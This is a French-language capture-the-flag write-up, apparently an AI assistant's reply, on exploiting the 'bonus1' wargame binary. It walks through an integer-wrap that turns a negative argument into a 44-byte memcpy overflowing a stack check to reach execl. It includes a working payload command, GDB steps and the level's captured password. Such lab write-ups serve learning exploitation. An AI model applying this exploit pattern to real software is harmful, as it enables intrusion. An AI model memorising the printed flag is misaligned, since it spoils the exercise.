# Schéma d'exploitation — bonus1

Voici un schéma clair et visuel expliquant le flux d'exécution, la disposition de la pile, la logique des vérifications et **pourquoi** la valeur `-2147483637` marche (et pas `-2147483647`).

---

## 1) Vue d'ensemble du flux (résumé)

1. `atoi(argv[1])` → résultat dans `eax` puis `mov %eax, 0x3c(%esp)`
2. `cmpl $0x9, 0x3c(%esp)` → `jle` (signed) : si `eax <= 9` on continue, sinon return
3. `ecx = eax * 4` (via `lea 0(,%eax,4)`)
4. `dest = esp + 0x14`, `src = argv[2]`, `memcpy(dest, src, ecx)`
5. Compare 4 bytes à `0x3c(%esp)` avec la constante `0x574F4C46` ("FLOW" little-endian)
6. Si égal → prépare arguments et `execl(...)` → shell

---

## 2) Disposition simplifiée de la pile (au moment du memcpy)

```
esp + 0x00   ───────────────────────────────
             | (top de la pile)            |
             | ...                         |
esp + 0x14   ──> DEST (début de la zone memcpy)  <-- memcpy écrira depuis ici
             | byte 0 (dest[0])            |
             | byte 1                      |
             | ...                         |
             | byte 39                     |
esp + 0x3c   ──> ZONE DE COMPARAISON (4 bytes)  <-- cible à écraser par memcpy pour mettre "FLOW"
             | byte 40                     |
             | byte 41                     |
             | byte 42                     |
             | byte 43                     |
esp + 0x40   ───────────────────────────────
```

* Distance entre `dest` et la zone de comparaison = `0x3c - 0x14 = 0x28 = 40` octets.
* Pour écrire aussi les 4 octets `"FLOW"` il faut donc copier `40 + 4 = 44` octets.

---

## 3) Condition contradictoire (la clef)

* Pour *entrer* dans la branche qui appelle `memcpy`, il faut que `atoi(argv[1]) <= 9` (signed).
* Pour que `memcpy` atteigne `esp+0x3c` et écrit `"FLOW"`, il faut que `ecx = atoi(argv1) * 4 >= 44`.

Avec un entier **positif** normal, ces deux conditions sont incompatibles. Mais **avec des valeurs négatives** on profite du wrapping 32-bits après multiplication.

---

## 4) Explication du wrapping (exemples)

Calcul : `ecx = (atoi(argv1) * 4) mod 2^32`

| argv1 (décimal) | atoi (hex 32-bit) | atoi*4 (signed) | atoi*4 mod 2^32 → ecx |
| --------------- | ----------------: | --------------: | --------------------: |
| -2147483647     |        0x80000001 |     -8589934588 |       0x00000004  → 4 |
| -2147483637     |        0x8000000B |     -8589934548 |      0x0000002C  → 44 |

* `-2147483647 * 4` wrap → `4` octets seulement (trop petit)
* `-2147483637 * 4` wrap → `44` octets exactement (permet d'écrire jusqu'à `esp+0x3c` et poser `FLOW`)

---

## 5) Exemple de payload fonctionnel

```bash
./bonus1 -2147483637 $(python2 -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

* `argv1 = -2147483637` → `ecx = 44` → `memcpy(dest=esp+0x14, src=argv2, 44)`
* `argv2` contient 40 padding `A` puis `FLOW` → après memcpy `esp+0x3c` contient `F L O W`
* la comparaison `cmpl $0x574F4C46, 0x3c(%esp)` devient vraie et `execl` est appelée

---

## 6) Commandes GDB utiles pour vérification

1. Breakpoint avant l'appel `atoi` / comparaison :

```
gdb -q --args ./bonus1 -2147483637 "$(python2 -c 'print "A"*40 + "\x46\x4c\x4f\x57"')"
# dans gdb :
b *0x08048438   # juste avant call atoi
run
x/wx $esp+0x3c   # voir valeur stockée par atoi
```

2. Breakpoint juste avant `memcpy` (adresse du call memcpy = 0x8048473) :

```
b *0x08048473
run
# inspecter registres
p/x $eax   # atoi value
p/x $ecx   # taille calculée
# après memcpy
x/4bx $esp+0x3c   # inspecte si 'F','L','O','W' sont là
```

3. Si tu veux tracer le retour et voir l'appel `execl` :

```
b *0x08048499   # instruction call execl@plt
c
# si le breakpoint est atteint, execl va être appelé ensuite
```

---

## 7) Autres valeurs utiles (table rapide)

|       argv1 |                              ecx (taille copiée) |
| ----------: | -----------------------------------------------: |
|          -1 |     0xFFFFFFFC → très grand (risque de segfault) |
| -2147483648 |                         0x00000000 → 0 (inutile) |
| -2147483647 |                                                4 |
| -2147483646 |                                                8 |
| -2147483645 |                                               12 |
| -2147483637 | 44  <-- valeur idéale minimale pour écraser FLOW |

*Astuce :* Toute `argv1` telle que `(argv1 * 4) mod 2^32 >= 44` fonctionnera pour atteindre `esp+0x3c`.

---

## 8) Stratégies et précautions

* L'approche avec valeurs négatives est **fiable** si tu choisis la bonne valeur (comme -2147483637).
* Éviter valeurs provoquant `ecx` gigantesque (ex: -1) car `memcpy` risque le segfault avant d'avoir copié la zone voulue.
* Si tu veux automatiser : écrire un petit script qui calcule `ecx = (v*4) & 0xffffffff` et teste si `ecx >= 44`.

---

Si tu veux, je peux ajouter une **version visuelle** avec flèches et indices encore plus granulaires, ou générer le script Python qui teste automatiquement une plage de valeurs et affiche celles qui conviennent. Dis-moi ce que tu préfères.
